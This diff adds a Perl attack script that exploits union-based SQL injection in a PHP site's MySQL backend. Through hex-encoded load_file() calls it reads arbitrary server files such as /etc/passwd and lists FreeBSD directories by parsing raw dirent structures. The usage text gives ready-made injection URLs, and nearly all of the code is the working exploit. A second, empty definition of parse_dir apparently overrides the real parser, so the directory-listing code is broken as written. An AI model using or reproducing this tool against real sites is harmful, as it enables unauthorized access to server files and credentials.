@@ -1,0 +1,184 @@
+#!/usr/bin/perl
+use LWP::UserAgent;
+use strict;
+use Getopt::Std;
+use vars qw / %opt /;
+
+use constant True => 1;
+
+my $rep_word = "FUCKBSD";
+my $sep_flag = "%!!";
+my $user_agent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1;.NET CLR 1.1.4122)";
+my $target = '';
+my $target_rep = '';
+my $dir = '';
+my $file = '';
+
+sub usage{
+
+print STDERR <<"EOF";
+dump_bsd_dir : List freebsd DIRS USE load_file with MYSQL
+By xi4oyu evil.xi4oyu#gmail.com
+
+http://www.pentestday.com
+
+usage: $0 [options]
+-u	: Inject url
+-d|-f   : DIR/FILE to list
+Ext: $0 -u http://www.xxx.com/index.php?id=-1/**/union/**/select/**/1,FUCKBSD,3 -d /etc
+     $0 -u http://www.xxx.com/index.php?id=-1/**/union/**/select/**/1,FUCKBSD,3 -f /etc/passwd
+
+EOF
+	exit;
+
+}
+
+sub hex_str{
+	my $hex_str = shift;
+	my $hexed_str = "0x";
+	$hexed_str .= unpack("H*",$hex_str);
+	return $hexed_str;
+
+}
+
+#This function parsed freebsd dirent struct and print out result
+
+=pod
+	src/sys/sys/dirent.h
+	Ref:http://fxr.watson.org/fxr/source/sys/dirent.h?v=FREEBSD7
+   49
+   50 struct dirent {
+   51         __uint32_t d_fileno;            /* file number of entry */
+   52         __uint16_t d_reclen;            /* length of this record */
+   53         __uint8_t  d_type;              /* file type, see below */
+   54         __uint8_t  d_namlen;            /* length of string in d_name */
+   55 #if __BSD_VISIBLE
+   56 #define MAXNAMLEN       255
+   57         char    d_name[MAXNAMLEN + 1];  /* name must be no longer than this */
+   58 #else
+   59         char    d_name[255 + 1];        /* name must be no longer than this */
+   60 #endif
+   61 };
+   62
+   63 #if __BSD_VISIBLE
+   64 /*
+   65  * File types
+   66  */
+   67 #define DT_UNKNOWN       0
+   68 #define DT_FIFO          1
+   69 #define DT_CHR           2
+   70 #define DT_DIR           4
+   71 #define DT_BLK           6
+   72 #define DT_REG           8
+   73 #define DT_LNK          10
+   74 #define DT_SOCK         12
+   75 #define DT_WHT          14
+
+=cut
+
+sub parse_dir{
+
+	my $dirent_hex = shift;
+	#skip 48
+	my $dir = substr($dirent_hex,48);
+	my $ent_len = 9;
+	my $index = 0;
+
+	while( True ){
+
+		my $header = substr($dir,$index,16);
+		my ($inode,$ent_len,$ent_type,$name_len) = unpack("LSCC",pack("H*",$header));
+		last if $ent_len == 0;
+		my $name = substr($dir,$index+16,$name_len * 2);
+		my $str_name = unpack("a*",pack("H*",$name));
+		my $type = "file:";
+		if($ent_type == 4){
+			$type = "dir:";
+			$str_name .= "/";
+
+		}elsif($ent_type == 10){
+			$type = "link:";
+
+		}elsif($ent_type == 1){
+			$type = "fifo:";
+		}elsif($ent_type == 12){
+			$type = "socket:";
+		}elsif($ent_type == 6){
+			$type = "blk:";
+		}
+		print "$type\t$str_name\n";
+
+		$index += 2* $ent_len;
+
+	}
+
+}
+
+sub get_that_shit{
+	my $hexed_str = shift;
+	my $url = $target;
+	$url =~ s/$rep_word/$hexed_str/g;
+
+	#print $url;
+	my $ua = LWP::UserAgent->new;
+
+        $ua->agent("$user_agent");
+
+        my $req = HTTP::Request->new(GET => "$url");
+        my $rest = $ua->request($req);
+	my $content = $rest->content;
+	#print $content;
+	my $ret = "ERROR";
+	#print $sep_flag;
+	if( $content =~ /$sep_flag(.*)$sep_flag/sg){
+		$ret = $1;
+	}
+	return $ret;
+
+}
+
+sub parse_dir{
+
+	my $hex_code = shift;
+
+}
+
+#================================================================#
+#Here We Go!
+
+my $opt_string = "u:d:f:";
+
+usage if $#ARGV < 0;
+
+getopts("$opt_string",\%opt) or usage();
+usage if $opt{h}; 
+
+$target = $opt{u} if $opt{u};
+$dir = $opt{d} if $opt{d};
+$file = $opt{f} if $opt{f};
+
+if(!$target || (!$dir && !$file)){
+	usage();
+}
+
+my $hexed_str = "";
+
+my $sep_flag_hex = hex_str($sep_flag);
+if($dir){
+	 $hexed_str = "hex(concat($sep_flag_hex,load_file(".hex_str($dir)."),$sep_flag_hex))";
+}else{
+
+	 $hexed_str = "concat($sep_flag_hex,load_file(".hex_str($file)."),$sep_flag_hex)";
+}
+
+#print $hexed_str."\n";
+my $ret_str = get_that_shit($hexed_str);	
+
+if($file){
+
+	print $ret_str;
+
+}else{
+	parse_dir($ret_str);
+
+}
